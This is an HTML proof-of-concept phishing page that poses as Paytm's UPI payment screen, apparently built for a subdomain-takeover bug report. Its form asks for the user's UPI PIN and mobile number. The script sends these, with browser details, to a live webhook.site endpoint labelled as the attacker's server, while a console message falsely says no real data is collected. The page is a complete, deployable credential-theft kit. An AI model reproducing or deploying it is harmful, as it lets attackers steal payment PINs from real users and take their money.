<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paytm - Secure Payment</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f6fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            border-top: 5px solid #00b9f5;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #00b9f5;
            font-size: 32px;
            font-weight: 700;
        }
        .logo p {
            color: #718096;
            font-size: 14px;
        }
        .alert {
            background: #fff5f5;
            border: 1px solid #fc8181;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .alert p {
            color: #c53030;
            font-size: 13px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #2d3748;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            border-color: #00b9f5;
            outline: none;
        }
        .payment-details {
            background: #f7fafc;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .payment-details .row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e2e8f0;
        }
        .payment-details .row:last-child {
            border-bottom: none;
        }
        .payment-details .label {
            color: #718096;
            font-size: 14px;
        }
        .payment-details .value {
            font-weight: 600;
            color: #2d3748;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #00b9f5;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #0098cc;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #a0aec0;
        }
        .secure-badge {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-top: 15px;
            font-size: 12px;
            color: #718096;
        }
        .secure-badge span {
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Paytm</h1>
            <p>Pay with UPI</p>
        </div>

        <div class="alert">
            <p>⚠️ Your payment is pending. Please complete the verification.</p>
        </div>

        <div class="payment-details">
            <div class="row">
                <span class="label">💰 Amount</span>
                <span class="value">₹5,000.00</span>
            </div>
            <div class="row">
                <span class="label">🏦 Bank</span>
                <span class="value">ICICI Bank</span>
            </div>
            <div class="row">
                <span class="label">📋 UPI ID</span>
                <span class="value">paytm@icici</span>
            </div>
            <div class="row">
                <span class="label">🕐 Status</span>
                <span class="value" style="color: #e53e3e;">Pending</span>
            </div>
        </div>

        <form id="paymentForm" onsubmit="return handlePayment(event)">
            <div class="form-group">
                <label>🔑 Enter UPI PIN</label>
                <input type="password" id="upiPin" placeholder="Enter your 6-digit UPI PIN" maxlength="6" required>
            </div>

            <div class="form-group">
                <label>📱 Mobile Number (OTP)</label>
                <input type="tel" id="mobile" placeholder="Enter registered mobile number" maxlength="10" required>
            </div>

            <button type="submit" class="btn" id="payBtn">💳 Pay ₹5,000</button>
        </form>

        <div class="secure-badge">
            <span>🔒</span>
            <span>256-bit SSL encrypted</span>
            <span>•</span>
            <span>🔑 RBI compliant</span>
        </div>

        <div class="footer">
            <p>© 2026 Paytm • All rights reserved</p>
        </div>
    </div>

    <script>
        function handlePayment(event) {
            event.preventDefault();

            const pin = document.getElementById('upiPin').value;
            const mobile = document.getElementById('mobile').value;

            if (!pin || pin.length < 6) {
                alert('Please enter a valid 6-digit UPI PIN');
                return false;
            }

            if (!mobile || mobile.length < 10) {
                alert('Please enter a valid mobile number');
                return false;
            }

            // 🔴 ATTACKER'S SERVER - Data Stealing
            const stolenData = {
                upiPin: pin,
                mobile: mobile,
                amount: '₹5,000',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                url: window.location.href
            };

            console.log('🔴 STOLEN DATA:', stolenData);

            // Send to attacker's server - YOUR WEBHOOK URL
            fetch('https://webhook.site/c5ff6394-312e-4771-afdb-e52a65b38152', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(stolenData)
            });

            alert('✅ Payment successful! (Demo: Data was sent to attacker)');

            // Show what was stolen
            document.querySelector('.container').innerHTML = `
                <div style="text-align: center; padding: 30px;">
                    <h1 style="color: #00b9f5;">⚠️ PAYMENT STOLEN!</h1>
                    <p style="color: #e53e3e; font-size: 18px; margin: 20px 0;">
                        🔴 UPI PIN: ${pin}
                    </p>
                    <p style="color: #e53e3e; font-size: 18px;">
                        📱 Mobile: ${mobile}
                    </p>
                    <hr style="margin: 20px 0;">
                    <p style="color: #718096; font-size: 14px;">
                        This is a demonstration of subdomain takeover.<br>
                        In a real attack, this data would be sent to the attacker.
                    </p>
                    <p style="color: #c53030; font-size: 12px; margin-top: 20px;">
                        🔴 SUBDOMAIN TAKEOVER - CRITICAL VULNERABILITY
                    </p>
                </div>
            `;

            return false;
        }

        // Show warning in console
        console.log('%c🔴 PAYTM SUBDOMAIN TAKEOVER!', 'font-size: 24px; color: red;');
        console.log('%cThis is a Proof of Concept. No real data is being collected.', 'font-size: 14px; color: orange;');
    </script>
</body>
</html>
